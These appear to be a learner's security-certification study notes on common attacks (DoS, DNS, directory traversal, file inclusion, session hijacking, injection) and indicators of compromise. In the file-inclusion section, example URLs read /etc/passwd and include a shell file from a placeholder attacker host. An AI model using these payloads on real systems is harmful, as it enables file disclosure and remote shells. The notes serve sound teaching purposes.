### Denial of Service (DoS)/Distributed Denial of Service (DDoS)
#### Denial of Service (DoS):
Used to describe an attack that attempts to make a computer or server's resources unavailable.
Categories:
##### Flood Attack:
Specialized type of DoS which attempts to send more packets to a single server or host then it can handle.
1. Ping Flood: A variety of Flood Attack in which a server is sent with too many pings (ICMP echo).
2. SYN Flood: An attacker will initiate multiple TCP sessions but never complete the three-way handshake.

Solutions:
- Flood Guards:
  Flood guards monitor traffic patterns and automatically detect abnormal spikes, such as excessive requests or packets. When a flood attack is detected, they throttle or block malicious traffic to prevent the system from being overwhelmed.
- Timeout:
  Implementing connection timeouts ensures that idle or half-open connections are terminated quickly. This prevents attackers from consuming server resources for long periods, reducing the impact of SYN floods or slow-loris–type attacks.
- Intrusion Prevention System (IPS):
  An IPS actively analyzes incoming traffic and identifies known flood attack signatures or anomalies. Once detected, it blocks the malicious traffic in real time, helping maintain service availability during attempted DoS or DDoS attacks.
##### Permanent Denial of Service (PDoS)
An attack which exploits a security flaw by re-flashing a firmware, permanently breaking networking device.
This can cause a device to be unable to reboot itself because its operating system is overwritten.
##### Fork Bomb
A large number of processes is created to use a computer's available processing power, a fork bomb is not a worm because it does not infect programs, and they do not use the network to spread.
#### Distributed Denial of Service (DDoS)
More machines are used to launch an attack simultaneously against a single server to create denial of service condition.
1. DNS Amplification Attack: Specialized DDoS that allow an attacker to initiate DNS requests from a spoof IP address to flood a website. Because the DNS request uses very little bandwidth to send, but the response usually takes up a lot more bandwidth, this allows the attack to be amplified.

Solutions:
- Blackhole / Sinkhole Routing:
  Blackhole routing drops all incoming traffic—both malicious and legitimate—to a targeted IP address, preventing the attack from reaching the network. Sinkhole routing is more controlled, redirecting malicious traffic to a safe server for analysis instead of letting it hit the victim system.
- Intrusion Detection (IDS):
  An IDS monitors network traffic for unusual patterns, high request rates, or known DDoS signatures. It alerts administrators early, helping them react before the attack causes widespread service disruption.
- Elastic Cloud Infrastructure:
  Elastic cloud environments can automatically scale resources—like bandwidth, CPU, and servers-when traffic surges. This scalability absorbs large volumes of malicious traffic, preventing service outages during DDoS attacks.
### Domain Name System (DNS) Attacks
Domain Name System (DNS):
Responsible for translating human-friendly domain names into IP addresses that computer can understand.
DNS Attacks:
1. DNS Cache Poisoning:
   DNS cache poisoning occurs when an attacker injects false DNS records into a resolver’s cache. As a result, users are redirected to malicious websites even though they entered the correct domain name.
   DNSSEC (Domain Name System Security Extensions) is a security feature designed to protect DNS from tampering and attacks like DNS cache poisoning by adding authentication and integrity to DNS responses.
   
2. DNS Amplification Attacks:
   The attacker spoofs the victim’s IP and sends small DNS queries to open resolvers that generate large responses. The amplified responses flood the victim’s server, overwhelming it with traffic.
   Limit the size of DNS responses or rate limit any DNS response traffic.
   
3. DNS Tunneling:
   DNS tunneling hides malicious data or command-and-control traffic inside DNS queries and responses. Attackers use this technique to bypass firewalls and exfiltrate data or maintain covert communication channels.
   
4. Domain Hijacking:
   Domain hijacking involves taking unauthorized control of a domain name by exploiting weaknesses like stolen credentials, registrar vulnerabilities, or DNS misconfigurations. Attackers can redirect traffic, impersonate services, or disrupt business operations.
   Domain Registry Lock is a high-security service that prevents unauthorized changes to a domain name at the registry level. It blocks modifications like DNS changes, domain transfers, or deletion unless the domain owner completes a strict manual verification process. This protects against domain hijacking even if an attacker gains access to the registrar account.

5. DNS Zone Transfer Attacks:
   DNS zone transfers are intended for synchronizing DNS information between servers. If not properly secured, attackers can request a zone transfer to download the entire DNS database, revealing internal hostnames, IPs, and network structure for further attacks.

DNS attacks exploit the domain name system's vulnerabilities to disrupt service, steal information, or redirect a website's traffic.
### Directory Traversal Attack
A type of injection attack that allows access to commands, files, and directories, either connected to web document root directory or not.

The web document root (web root) is the top-level directory on a web server that contains all files meant to be publicly accessible on a website. Anything inside this folder can be served directly to users through the browser. Above the web root, the server contains many other internal folders and files that are not meant for public access. Attackers often try to reach these sensitive directories using directory traversal attacks to access configuration files or system data.

`http://example.com/download.php?file=../../../../etc/passwd`

The attacker manipulates a file parameter by adding `../` sequences, which instruct the server to move up directories beyond the web document root. If the application lacks proper input validation, the server might access sensitive system files like /etc/passwd instead of the intended public file-exposing critical internal information.

`Attackers may hide directory traversal attempts by using %2e%2e%2e%2f to represent ../`
##### File Inclusion
Allows an attacker to either download files from an arbitrary location or upload an executable or script file to open a backdoor.
1. Local File Inclusion (LFI):
   LFI occurs when a web application loads files from the local server based on user input without proper validation.
   An attacker abuses this to read sensitive local files or sometimes gain code execution.
   Example:
   `http://victim.com/?page=../../../../etc/passwd`
   
2. Remote File Inclusion (RFL):
   RFI allows an attacker to **load a remote file from another server** into the vulnerable web application. 
   This happens when `allow_url_include` is enabled (PHP) and user input is used in file inclusion.
   Example: 
   `http://victim.com/?page=http://attacker.com/shell.txt`
### Execution and Escalation Attack
##### Arbitrary Code Execution
A vulnerability that allows an attacker to run a code or module that exploits such a vulnerability.
##### Remote Code Execution
A type of arbitrary code execution that allows an attacker to transmit code from a remote host.
##### Privilege Escalation
Occurs when a user accesses or modifies specific resources that they are not entitled to normally access.
- Vertical Privilege Escalation: From normal level user to higher level
- Horizontal Privilege Escalation: From one user to another of generally the same level
##### Rootkit
A class of malware that modifies system files, often at the kernel level, to conceal its presence.
- User-mode Rootkit:
  A user-mode rootkit operates in the application's space (typically Ring 3 but can gain higher privileges like Ring 1–2 if running with admin rights). It hides processes, files, or activities by hooking user-space APIs and modifying libraries instead of the kernel. It is easier to detect and less powerful than kernel-level rootkits.
- Kernel-mode Rootkit:
  A kernel-mode rootkit runs in Ring 0, giving it full control over the operating system. It modifies kernel structures, drivers, or system calls to hide its presence at a deeper level. This makes it extremely stealthy, harder to detect, and far more dangerous.
### Replay Attacks
Type of network-based attack that involves maliciously repeating or delaying valid data transmissions.
Example:
A classic replay attack occurs when an attacker captures a user’s authentication request—such as a login packet sent over an unencrypted Wi-Fi network—and later resends the exact same packet to the server. Even without knowing the user’s password, the attacker can gain access because the server treats the replayed packet as a valid login attempt.

MFA helps prevent replay attacks by requiring a second verification factor, so even if an attacker replays captured login data, they cannot complete authentication. Secure session tokens with timestamps, nonces, or one-time-use values also block replay attempts because any reused or expired token is automatically rejected by the server.

```
Session hijacking involves stealing a user’s active session token to immediately take over their ongoing session, allowing the attacker to act as the user in real time. In contrast, a replay attack captures legitimate authentication data and resends it later to trick the system into granting access, without needing to understand or modify the captured information.
```
### Session Hijacking
##### Session Management:
Session management is the process that allows a web application to uniquely identify and track a user across multiple requests, since HTTP itself is stateless. It typically uses session IDs or tokens to maintain the user’s authenticated state, ensuring that only the correct user can access their account, perform actions, and maintain continuity during their interaction with the application.

Web applications can maintain user state or track user actions either by storing information on the server (such as in a database or server-side session store) or on the client side using cookies. Cookies come in two types: non-persistent (session cookies), which exist only until the browser is closed, and persistent cookies, which remain on the user’s device until they expire or are manually deleted, and cookies can store session identifiers.
##### Session Hijacking
Session hijacking is an attack where an attacker steals or obtains a user’s valid session ID (usually stored in cookies) and uses it to take over their active session. Once the attacker has the session token, they can impersonate the user without needing their username or password, allowing them to access the user’s account, perform actions, or view sensitive information as if they were the legitimate user.
##### Session Prediction:
An Attacker attempts to predict the session token to hijack that session.
##### Cookie Poisoning
Modifying the contents of a cookie to be sent to a client's browser and exploit th4 vulnerabilities in an application.
### On-Path Attacks
An attack where the penetration tester puts the workstation logically between two hosts during the communication in order to transparently capture, monitor, and relay the communications between those hosts.
Example:
- ARP poisoning
- DNS poisoning
- Introducing a rogue Wireless Access Point (WAP)
- Introducing a rogue hover/switch
##### Replay
Occurs when an attacker captures a valid data which is then repeated immediately or delayed and then repeated.
##### Relay
Occurs when attackers insert themselves in between two hosts and become part of the conversation.
##### SSL Stripping
SSL stripping is a man-in-the-middle attack where the attacker downgrades a secure HTTPS connection to an insecure HTTP connection without the user noticing. The victim thinks they are securely connected, but the attacker intercepts all data—including passwords—before sending it to the server over HTTPS.
# Injection Attacks
1. LDAP Injection:
   LDAP Injection happens when an attacker manipulates user input that is used in LDAP queries, allowing them to modify directory searches or bypass authentication. By injecting special LDAP characters, attackers can retrieve unauthorized directory information or even log in without valid credentials.
   
2. Command Injection:
   Command Injection occurs when an application passes un-sanitized user input into a system command, allowing an attacker to execute arbitrary OS commands. This lets them run harmful actions like reading sensitive files, creating backdoors, or taking full control of the server.
   
3. Process Injection:
   Process injection is when malware or an attacker injects malicious code into a legitimate process’s memory space. This makes the malware run under a trusted process (like explorer.exe or svchost.exe), helping it evade detection, escalate privileges, or persist on the system.
   To mitigate against process injections, you should use endpoint security solutions, security kernel module and practice of least privilege.
### Indicator of Compromise
1. Account lockout:
   Multiple lockouts or a sudden spike in failed logons suggests password‑spray or brute‑force activity, often automated and sometimes malware‑driven (botnets, credential‑stuffing tools).

2. Concurrent session utilization:
   Multiple active sessions for the same account, especially from different devices or geolocation, suggests account compromise or session hijacking rather than normal user behavior.

3. Blocked content:
   Security controls (web filters, email gateways, EDR, firewall) repeatedly blocking known‑malicious domains, URLs, or payloads from the same user or host indicates infection attempts or active C2 communication.

4. Impossible travel:
   Logins or token use from geographically distant locations within a time window that makes physical travel impossible strongly indicates stolen credentials or session abuse.

5. Resource consumption:
   Abnormally high CPU, RAM, disk, or network usage on endpoints/servers without a legitimate workload often maps to crypto-miners, worms, or data exfiltration tools.

6. Resource inaccessibility:
   Legitimate services, shares, or applications suddenly becoming unavailable can reflect ransomware, destructive malware, or DoS conditions.

7. Out‑of‑cycle logging:
   Logs appearing at unusual times (e.g., heavy activity at 3 AM for a 9‑to‑5 environment) can indicate scripted or automated malicious tasks.

8. Missing logs:
   Sudden gaps in security, application, or audit logs may mean log deletion or pipeline tampering, a common anti‑forensics technique used by sophisticated malware and attackers.

9. Published or Documented:
   Attacks refer to malware or cyberattacks that are publicly reported through news outlets, cybersecurity blogs, or advisories. If these attacks target vulnerabilities in widely used systems, organizations should be vigilant, as similar attacks could target them.

Next module [[19. Hardening]]


  